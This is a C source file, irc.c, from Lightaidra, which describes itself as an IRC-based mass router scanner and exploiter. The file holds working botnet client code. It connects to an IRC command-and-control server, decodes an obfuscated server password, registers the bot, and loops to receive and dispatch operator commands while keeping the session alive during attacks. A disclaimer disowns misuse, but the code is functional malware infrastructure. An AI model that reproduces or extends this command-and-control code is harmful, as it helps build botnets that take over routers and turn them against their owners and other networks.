/*
 * irc.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

char *getrstr();
int sockwrite(int sd, const char *fmt, ...);
int irc_requests(sock_t * sp, requests_t * req);
int pub_requests(sock_t * sp, requests_t * req);

/* connect_to_irc(sock_t *) */
/* make an irc connection.  */
int connect_to_irc(sock_t *sp) {
    int ps = 0, port = 0;
    requests_t *req;
    char *token, srv[32];

    memset(srv, 0, sizeof srv);
    token = strtok(isrv[counter], ":");
    while (token != NULL) {
        if (!ps) {
            strncpy(srv, token, sizeof(srv)-1);
            ps++;
        }
        else {
            port = atoi(token);
        }

        token = strtok(NULL, ":");
    }

    sp->sockfd = false;
    if (!(sp->sockhs = gethostbyname(srv))) return EXIT_FAILURE;
    sp->sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sp->sockadr.sin_family = AF_INET;
    sp->sockadr.sin_port = htons(port);
    sp->sockadr.sin_addr = *((struct in_addr *)sp->sockhs->h_addr);

    memset(sp->sockadr.sin_zero, '\0', sizeof sp->sockadr.sin_zero);

    if (connect(sp->sockfd, (struct sockaddr *)&sp->sockadr, sizeof sp->sockadr) == false)
        return EXIT_FAILURE;

    getrstr();
    snprintf(channel, sizeof(channel)-1, "%s", irc_chan);
    snprintf(nt, 3, "->%s", nctype);

    /* IRCD PASSWORD FOR MODDED SERVER/CLIENT WITH REPLACED PASS/local */
    if (encirc != 0) {
        decode(enc_passwd, 1);
        if (sockwrite(sp->sockfd, "%s %s\n", passproto, decodedpsw)) 
            return EXIT_FAILURE;
    } 
    else {
        if (sockwrite(sp->sockfd, "%s %s\n", passproto, irc_passwd)) 
            return EXIT_FAILURE;
    }

    if (sockwrite(sp->sockfd, "NICK %s\n", data_ptr))
        return EXIT_FAILURE;
    
    if (sockwrite(sp->sockfd, "USER pwn localhost localhost :Lightaidra ;)\n"))
        return EXIT_FAILURE;

    req = (requests_t *) malloc(sizeof(requests_t));

    if (irc_requests(sp, req)) {
        free(req);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

/* irc_requests(sock_t *, requests_t *) */
/* manage the requests.                 */
int irc_requests(sock_t *sp, requests_t *req) {
    if (max_pids > 0) kill(g_pid, 9);

    stop = 0;
    max_pids = 0;
    login_status = false;
    srchost = 0;

    for (;;) {
        while ((pid = waitpid(-1, &pid_status, WNOHANG)) > 0) max_pids = 0;

        if (max_pids == 0 && stop == 0) {
            sleep(2);
            sockwrite(sp->sockfd, "TOPIC %s\n", channel);
        }

        /* stay alive in irc when operating started. */
        /* to prevent the connection reset           */
        if (max_pids > 0) {
            sleep(4);
            cmd_ping(sp);
        }

        memset(netbuf, 0, sizeof netbuf);
        recv_bytes = recv(sp->sockfd, netbuf, sizebuf - 1, 0);

        if (recv_bytes == true) return EXIT_FAILURE;
        netbuf[recv_bytes] = 0;
            
        if (background_mode) {
            puts(netbuf);
            fflush(stdout);
        }

        if (pub_requests(sp, req)) return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
